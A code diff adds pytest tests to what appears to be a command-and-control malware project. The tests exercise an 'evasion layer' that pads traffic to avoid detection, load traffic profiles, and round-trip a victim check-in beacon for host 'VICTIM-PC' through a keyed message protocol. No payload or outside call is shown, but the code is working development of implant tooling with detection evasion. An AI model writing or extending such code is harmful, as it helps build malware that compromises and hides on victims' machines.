@@ -1,5 +1,6 @@
 import struct
 import pytest
+import random
 
 from common.message_format import (
     pack, unpack,
@@ -338,3 +339,59 @@ class TestPackValidation:
         # pack() must raise ProtocolError for non-JSON-serialisable values
         with pytest.raises(ProtocolError):
             pack({'msg_type': 'CHECKIN', 'data': object()}, key)
+
+# evasion layer — padding integration tests
+class TestPaddingIntegration:
+
+    def test_pad_strip_round_trip_50_random_payloads(self):
+        # pad then strip_padding returns original plaintext for 50 random payloads
+        import os
+        from evasion.padding_strat import pad, strip_padding
+
+        for _ in range(50):
+            original = os.urandom(random.randint(1, 512))
+            padded   = pad(original, 0, 128)
+            assert strip_padding(padded) == original, \
+                "FAIL: strip_padding did not recover original plaintext"
+
+    def test_pad_zero_limits_prepends_only_header(self):
+        # with padding_min=0, padding_max=0: padded contains only 2-byte header + original
+        import struct
+        from evasion.padding_strat import pad, strip_padding
+
+        original = b'hello world'
+        padded   = pad(original, 0, 0)
+        assert padded == struct.pack('>H', 0) + original, \
+            "FAIL: zero-limit pad should prepend only 2-byte zero header"
+        assert strip_padding(padded) == original, \
+            "FAIL: strip_padding should recover original for zero-limit pad"
+
+    def test_pad_nonzero_limits_increases_length(self):
+        # with padding_min=64, padding_max=128: padded is always longer than original
+        from evasion.padding_strat import pad
+
+        original = b'hello world'
+        for _ in range(20):
+            padded = pad(original, 64, 128)
+            # 2-byte header + 64-128 pad bytes + original
+            assert len(padded) >= 2 + 64 + len(original), \
+                f"FAIL: padded length {len(padded)} not greater than original {len(original)}"
+            assert len(padded) <= 2 + 128 + len(original), \
+                f"FAIL: padded length {len(padded)} exceeds max expected"
+
+    def test_pack_unpack_round_trip_with_medium_profile(self, key):
+        # pack/unpack round-trips correctly with padding active (medium profile)
+        from transport.traffic_profile import load_profile
+
+        profile = load_profile('medium')
+        assert profile.padding_min == 0
+        assert profile.padding_max == 128
+
+        payload   = build_checkin('VICTIM-PC', 'jdoe', 'Windows 10', '1.0.0', 20)
+        raw       = pack(payload, key)
+        recovered = unpack(raw, key)
+
+        assert recovered['msg_type']              == MSG_CHECKIN
+        assert recovered['payload']['hostname']   == 'VICTIM-PC'
+        assert recovered['payload']['username']   == 'jdoe'
+        assert recovered['payload']['agent_ver']  == '1.0.0'
